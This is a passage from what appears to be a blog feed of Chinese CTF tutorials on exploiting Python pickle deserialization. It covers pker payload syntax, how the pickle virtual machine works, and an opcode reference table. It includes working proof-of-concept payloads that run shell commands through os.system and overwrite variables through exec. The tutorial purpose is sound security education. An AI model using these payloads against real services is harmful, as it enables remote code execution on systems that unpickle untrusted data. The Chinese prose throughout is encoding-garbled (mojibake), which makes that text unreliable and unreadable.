class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-keyword">system</span>(s) # `b<span class="hljs-string">&#x27;R&#x27;</span>`è°ƒç”¨<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><ul><li>é€šè¿‡<code>b&#39;i&#39;</code>è°ƒç”¨ï¼š</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><ul><li>é€šè¿‡<code>b&#39;c&#39;</code>ä¸<code>b&#39;o&#39;</code>è°ƒç”¨ï¼š</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)</span></span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>å¤šå‚æ•°è°ƒç”¨å‡½æ•°</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>[, par0,par1...])</span></span><br><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>)</span></span><span class="hljs-selector-attr">[, par0,par1...]</span>)<br></code></pre></td></tr></table></figure><h4 id="pkerï¼šå®ä¾‹åŒ–å¯¹è±¡"><a href="#pkerï¼šå®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="pkerï¼šå®ä¾‹åŒ–å¯¹è±¡"></a>pkerï¼šå®ä¾‹åŒ–å¯¹è±¡</h4><ul><li>å®ä¾‹åŒ–å¯¹è±¡æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°æ‰§è¡Œ</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br><br><br><span class="hljs-meta"># æˆ–è€…</span><br><br>animal = OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>), <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><ul><li>å…¶ä¸­ï¼ŒpythonåŸæ–‡ä»¶ä¸­åŒ…å«ï¼š</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, name, category</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.category = category<br></code></pre></td></tr></table></figure><ul><li>ä¹Ÿå¯ä»¥å…ˆå®ä¾‹åŒ–å†èµ‹å€¼ï¼š</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>)<br>animal.name=<span class="hljs-string">&#x27;1&#x27;</span><br>animal.category=<span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><h4 id="æ‰‹åŠ¨è¾…åŠ©"><a href="#æ‰‹åŠ¨è¾…åŠ©" class="headerlink" title="æ‰‹åŠ¨è¾…åŠ©"></a>æ‰‹åŠ¨è¾…åŠ©</h4><ul><li>æ‹¼æ¥opcodeï¼šå°†ç¬¬ä¸€ä¸ªpickleæµç»“å°¾è¡¨ç¤ºç»“æŸçš„<code>.</code>å»æ‰ï¼Œä¸¤è€…æ‹¼æ¥èµ·æ¥å³å¯ã€‚</li><li>å»ºç«‹æ™®é€šçš„ç±»æ—¶ï¼Œå¯ä»¥å…ˆpickle.dumpsï¼Œå†æ‹¼æ¥è‡³payloadã€‚</li></ul><p>å‚è€ƒï¼š <a href="https://xz.aliyun.com/news/6608">https://xz.aliyun.com/news/6608</a> </p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>opcode</tag>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pickleååºåˆ—åŒ–</title>
    <link href="/tuyi/2025/01/25/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/tuyi/2025/01/25/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯pickle"><a href="#ä»€ä¹ˆæ˜¯pickle" class="headerlink" title="ä»€ä¹ˆæ˜¯pickle"></a>ä»€ä¹ˆæ˜¯pickle</h1><ul><li><p>pickleå®é™…ä¸Šæ˜¯ä¸€é—¨æ ˆè¯­è¨€</p></li><li><p>ä¸PHPç±»ä¼¼ï¼Œpythonä¹Ÿæœ‰åºåˆ—åŒ–åŠŸèƒ½ä»¥é•¿æœŸå‚¨å­˜å†…å­˜ä¸­çš„æ•°æ®ã€‚pickleæ˜¯pythonä¸‹çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åŒ…</p></li><li><p>ä¸jsonç›¸æ¯”ï¼Œpickleä»¥äºŒè¿›åˆ¶å‚¨å­˜ï¼Œä¸æ˜“äººå·¥é˜…è¯»ï¼›jsonå¯ä»¥è·¨è¯­è¨€ï¼Œè€Œpickleæ˜¯Pythonä¸“ç”¨çš„ï¼›pickleèƒ½è¡¨ç¤ºpythonå‡ ä¹æ‰€æœ‰çš„ç±»å‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»å‹ï¼‰ï¼Œjsonåªèƒ½è¡¨ç¤ºä¸€éƒ¨åˆ†å†…ç½®ç±»å‹ä¸”ä¸èƒ½è¡¨ç¤ºè‡ªå®šä¹‰ç±»å‹ã€‚</p></li><li><p>pickleå®é™…ä¸Šå¯ä»¥çœ‹ä½œä¸€ç§<strong>ç‹¬ç«‹çš„è¯­è¨€</strong>ï¼Œé€šè¿‡å¯¹opcodeçš„æ›´æ”¹ç¼–å†™å¯ä»¥æ‰§è¡Œpythonä»£ç ã€è¦†ç›–å˜é‡ç­‰æ“ä½œã€‚ç›´æ¥ç¼–å†™çš„opcodeçµæ´»æ€§æ¯”ä½¿ç”¨pickleåºåˆ—åŒ–ç”Ÿæˆçš„ä»£ç æ›´é«˜ï¼Œæœ‰çš„ä»£ç ä¸èƒ½é€šè¿‡pickleåºåˆ—åŒ–å¾—åˆ°ï¼ˆpickleè§£æèƒ½åŠ›å¤§äºpickleç”Ÿæˆèƒ½åŠ›ï¼‰ã€‚</p></li></ul><h2 id="å¯åºåˆ—åŒ–çš„å¯¹è±¡"><a href="#å¯åºåˆ—åŒ–çš„å¯¹è±¡" class="headerlink" title="å¯åºåˆ—åŒ–çš„å¯¹è±¡"></a>å¯åºåˆ—åŒ–çš„å¯¹è±¡</h2><ul><li><code>None</code> ã€ <code>True</code> å’Œ <code>False</code></li><li>æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¤æ•°</li><li>strã€byteã€bytearray</li><li>åªåŒ…å«å¯å°å­˜å¯¹è±¡çš„é›†åˆï¼ŒåŒ…æ‹¬ tupleã€listã€set å’Œ dict</li><li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å‡½æ•°ï¼ˆä½¿ç”¨ def å®šä¹‰ï¼Œlambda å‡½æ•°åˆ™ä¸å¯ä»¥ï¼‰</li><li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å†…ç½®å‡½æ•°</li><li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„ç±»</li><li><code>__dict__</code> å±æ€§å€¼æˆ– <code>__getstate__()</code> å‡½æ•°çš„è¿”å›å€¼å¯ä»¥è¢«åºåˆ—åŒ–çš„ç±»ï¼ˆè¯¦è§å®˜æ–¹æ–‡æ¡£çš„Pickling Class Instancesï¼‰</li></ul><h2 id="object-reduce-å‡½æ•°"><a href="#object-reduce-å‡½æ•°" class="headerlink" title="object.__reduce__() å‡½æ•°"></a><code>object.__reduce__()</code> å‡½æ•°</h2><ul><li>åœ¨å¼€å‘æ—¶ï¼Œå¯ä»¥é€šè¿‡é‡å†™ç±»çš„ <code>object.__reduce__()</code> å‡½æ•°ï¼Œä½¿ä¹‹åœ¨è¢«å®ä¾‹åŒ–æ—¶æŒ‰ç…§é‡å†™çš„æ–¹å¼è¿›è¡Œã€‚å…·ä½“è€Œè¨€ï¼Œpythonè¦æ±‚ <code>object.__reduce__()</code> è¿”å›ä¸€ä¸ª <code>(callable, ([para1,para2...])[,...])</code> çš„å…ƒç»„ï¼Œæ¯å½“è¯¥ç±»çš„å¯¹è±¡è¢«unpickleæ—¶ï¼Œè¯¥callableå°±ä¼šè¢«è°ƒç”¨ä»¥ç”Ÿæˆå¯¹è±¡ï¼ˆè¯¥callableå…¶å®æ˜¯æ„é€ å‡½æ•°ï¼‰ã€‚</li><li>åœ¨ä¸‹æ–‡pickleçš„opcodeä¸­ï¼Œ <code>R</code> çš„ä½œç”¨ä¸ <code>object.__reduce__()</code> å…³ç³»å¯†åˆ‡ï¼šé€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°ã€‚å…¶å® <code>R</code> æ­£å¥½å¯¹åº” <code>object.__reduce__()</code> å‡½æ•°ï¼Œ <code>object.__reduce__()</code> çš„è¿”å›å€¼ä¼šä½œä¸º <code>R</code> çš„ä½œç”¨å¯¹è±¡ï¼Œå½“åŒ…å«è¯¥å‡½æ•°çš„å¯¹è±¡è¢«pickleåºåˆ—åŒ–æ—¶ï¼Œå¾—åˆ°çš„å­—ç¬¦ä¸²æ˜¯åŒ…å«äº† <code>R</code> çš„ã€‚</li></ul><h1 id="pickleè¿‡ç¨‹è¯¦ç»†è§£è¯»"><a href="#pickleè¿‡ç¨‹è¯¦ç»†è§£è¯»" class="headerlink" title="pickleè¿‡ç¨‹è¯¦ç»†è§£è¯»"></a>pickleè¿‡ç¨‹è¯¦ç»†è§£è¯»</h1><ul><li>pickleè§£æä¾é Pickle Virtual Machine (PVM)è¿›è¡Œã€‚</li><li>PVMæ¶‰åŠåˆ°ä¸‰ä¸ªéƒ¨åˆ†ï¼š1. è§£æå¼•æ“ 2. æ ˆ 3. å†…å­˜ï¼š</li><li>è§£æå¼•æ“ï¼šä»æµä¸­è¯»å– opcode å’Œå‚æ•°ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†ã€‚é‡å¤è¿™ä¸ªåŠ¨ä½œï¼Œç›´åˆ°é‡åˆ° <code>.</code> åœæ­¢ã€‚æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›ã€‚</li><li>æ ˆï¼šç”±Pythonçš„listå®ç°ï¼Œè¢«ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡ã€‚</li><li>memoï¼šç”±Pythonçš„dictå®ç°ï¼Œä¸ºPVMçš„ç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨ã€‚è¯´äººè¯ï¼šå°†ååºåˆ—åŒ–å®Œæˆçš„æ•°æ®ä»¥ <code>key-value</code> çš„å½¢å¼å‚¨å­˜åœ¨memoä¸­ï¼Œä»¥ä¾¿åæ¥ä½¿ç”¨ã€‚</li><li>PVMè§£æ <code>str</code> çš„è¿‡ç¨‹åŠ¨å›¾ï¼š</li></ul><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200320230631-6204866e-6abc-1.gif" alt="img"></p><ul><li><p>PVMè§£æ <code>__reduce__()</code> çš„è¿‡ç¨‹åŠ¨å›¾ï¼š</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200320230711-7972c0ea-6abc-1.gif" alt="img"></p></li></ul><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>pickle EXPçš„ç®€å•demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">genpoc</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        s = <span class="hljs-string">&quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot;</span>  <span class="hljs-comment"># è¦æ‰§è¡Œçš„å‘½ä»¤</span><br>        <span class="hljs-keyword">return</span> os.system, (s,)        <span class="hljs-comment"># reduceå‡½æ•°å¿…é¡»è¿”å›å…ƒç»„æˆ–å­—ç¬¦ä¸²</span><br><br>e = genpoc()<br>poc = pickle.dumps(e)<br><br><span class="hljs-built_in">print</span>(poc) <span class="hljs-comment"># æ­¤æ—¶ï¼Œå¦‚æœ pickle.loads(poc)ï¼Œå°±ä¼šæ‰§è¡Œå‘½ä»¤</span><br></code></pre></td></tr></table></figure><p>å˜é‡è¦†ç›–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br>key1 = <span class="hljs-string">b&#x27;321&#x27;</span><br>key2 = <span class="hljs-string">b&#x27;123&#x27;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span>,))<br><br>a = A()<br>pickle_a = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(pickle_a)<br>pickle.loads(pickle_a)<br><span class="hljs-built_in">print</span>(key1, key2) <span class="hljs-comment">#è¦†ç›–</span><br></code></pre></td></tr></table></figure><h1 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h1><ul><li>åœ¨CTFä¸­ï¼Œå¾ˆå¤šæ—¶å€™éœ€è¦ä¸€æ¬¡æ‰§è¡Œå¤šä¸ªå‡½æ•°æˆ–ä¸€æ¬¡è¿›è¡Œå¤šä¸ªæŒ‡ä»¤ï¼Œæ­¤æ—¶å°±ä¸èƒ½å…‰ç”¨ <code>__reduce__</code> æ¥è§£å†³é—®é¢˜ï¼ˆreduceä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼Œå½“execè¢«ç¦ç”¨æ—¶ï¼Œå°±ä¸èƒ½ä¸€æ¬¡æ‰§è¡Œå¤šæ¡æŒ‡ä»¤äº†ï¼‰ï¼Œè€Œéœ€è¦æ‰‹åŠ¨æ‹¼æ¥æˆ–æ„é€ opcodeäº†ã€‚æ‰‹å†™opcodeæ˜¯pickleååºåˆ—åŒ–æ¯”è¾ƒéš¾çš„åœ°æ–¹ã€‚</li><li>åœ¨è¿™é‡Œå¯ä»¥ä½“ä¼šåˆ°ä¸ºä½•pickle<strong>æ˜¯ä¸€ç§è¯­è¨€</strong>ï¼Œç›´æ¥ç¼–å†™çš„opcodeçµæ´»æ€§æ¯”ä½¿ç”¨pickleåºåˆ—åŒ–ç”Ÿæˆçš„ä»£ç æ›´é«˜ï¼Œåªè¦ç¬¦åˆpickleè¯­æ³•ï¼Œå°±å¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–ã€å‡½æ•°æ‰§è¡Œç­‰æ“ä½œã€‚</li><li>æ ¹æ®å‰æ–‡ä¸åŒç‰ˆæœ¬çš„opcodeå¯ä»¥çœ‹å‡ºï¼Œç‰ˆæœ¬0çš„opcodeæ›´æ–¹ä¾¿é˜…è¯»ï¼Œæ‰€ä»¥æ‰‹åŠ¨ç¼–å†™æ—¶ï¼Œä¸€èˆ¬é€‰ç”¨ç‰ˆæœ¬0çš„opcodeã€‚ä¸‹æ–‡ä¸­ï¼Œæ‰€æœ‰opcodeä¸ºç‰ˆæœ¬0çš„opcode</li></ul><h2 id="å¸¸ç”¨opcodeè§£æ"><a href="#å¸¸ç”¨opcodeè§£æ" class="headerlink" title="å¸¸ç”¨opcodeè§£æ"></a>å¸¸ç”¨opcodeè§£æ</h2><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200320230711-7972c0ea-6abc-1.gif" alt="img"></p><p>å¸¸ç”¨çš„opcodeå¦‚ä¸‹ï¼šå®Œæ•´çš„å¯åœ¨<code>$PYTHON/Lib/pickle.py</code>æŸ¥çœ‹</p><table><thead><tr><th>opcode</th><th>æè¿°</th><th>å…·ä½“å†™æ³•</th><th>æ ˆä¸Šçš„å˜åŒ–</th><th>memoä¸Šçš„å˜åŒ–</th></tr></thead><tbody><tr><td>c</td><td>è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ–importä¸€ä¸ªæ¨¡å—ï¼ˆæ³¨ï¼šä¼šè°ƒç”¨importè¯­å¥ï¼Œèƒ½å¤Ÿå¼•å…¥æ–°çš„åŒ…ï¼‰</td><td>c[module]\n[instance]\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>o</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td>o</td><td>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td><td>æ— </td></tr><tr><td>i</td><td>ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td>i[module]\n[callable]\n</td><td>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td><td>æ— </td></tr><tr><td>N</td><td>å®ä¾‹åŒ–ä¸€ä¸ªNone</td><td>N</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>S</td><td>å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</td><td>Sâ€™xxxâ€™\nï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·ã€&#39;ç­‰pythonå­—ç¬¦ä¸²å½¢å¼ï¼‰</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>V</td><td>å®ä¾‹åŒ–ä¸€ä¸ªUNICODEå­—ç¬¦ä¸²å¯¹è±¡</td><td>Vxxx\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>I</td><td>å®ä¾‹åŒ–ä¸€ä¸ªintå¯¹è±¡</td><td>Ixxx\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>F</td><td>å®ä¾‹åŒ–ä¸€ä¸ªfloatå¯¹è±¡</td><td>Fx.x\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>R</td><td>é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°</td><td>R</td><td>å‡½æ•°å’Œå‚æ•°å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼å…¥æ ˆ</td><td>æ— </td></tr><tr><td>.</td><td>ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸ºpickle.loads()çš„è¿”å›å€¼</td><td>.</td><td>æ— </td><td>æ— </td></tr><tr><td>(</td><td>å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªMARKæ ‡è®°</td><td>(</td><td>MARKæ ‡è®°å…¥æ ˆ</td><td>æ— </td></tr><tr><td>t</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„</td><td>t</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>)</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„</td><td>)</td><td>ç©ºå…ƒç»„å…¥æ ˆ</td><td>æ— </td></tr><tr><td>l</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨</td><td>l</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>]</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨</td><td>]</td><td>ç©ºåˆ—è¡¨å…¥æ ˆ</td><td>æ— </td></tr><tr><td>d</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰</td><td>d</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td>æ— </td></tr><tr><td>}</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸</td><td>}</td><td>ç©ºå­—å…¸å…¥æ ˆ</td><td>æ— </td></tr><tr><td>p</td><td>å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³memo_n</td><td>pn\n</td><td>æ— </td><td>å¯¹è±¡è¢«å‚¨å­˜</td></tr><tr><td>g</td><td>å°†memo_nçš„å¯¹è±¡å‹æ ˆ</td><td>gn\n</td><td>å¯¹è±¡è¢«å‹æ ˆ</td><td>æ— </td></tr><tr><td>0</td><td>ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡</td><td>0</td><td>æ ˆé¡¶å¯¹è±¡è¢«ä¸¢å¼ƒ</td><td>æ— </td></tr><tr><td>b</td><td>ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ªå±æ€§å: å±æ€§å€¼çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®</td><td>b</td><td>æ ˆä¸Šç¬¬ä¸€ä¸ªå…ƒç´ å‡ºæ ˆ</td><td>æ— </td></tr><tr><td>s</td><td>å°†æ ˆçš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºkey-valueå¯¹ï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸ºkeyï¼‰ä¸­</td><td>s</td><td>ç¬¬ä¸€ã€äºŒä¸ªå…ƒç´ å‡ºæ ˆï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨æˆ–å­—å…¸ï¼‰æ·»åŠ æ–°å€¼æˆ–è¢«æ›´æ–°</td><td>æ— </td></tr><tr><td>u</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­</td><td>u</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œå­—å…¸è¢«æ›´æ–°</td><td>æ— </td></tr><tr><td>a</td><td>å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ appendåˆ°ç¬¬äºŒä¸ªå…ƒç´ (åˆ—è¡¨)ä¸­</td><td>a</td><td>æ ˆé¡¶å…ƒç´ å‡ºæ ˆï¼Œç¬¬äºŒä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰è¢«æ›´æ–°</td><td>æ— </td></tr><tr><td>e</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶extendsåˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­</td><td>e</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œåˆ—è¡¨è¢«æ›´æ–°</td><td>æ— </td></tr></tbody></table><p>æ­¤å¤–ï¼Œ <code>TRUE</code> å¯ä»¥ç”¨ <code>I</code> 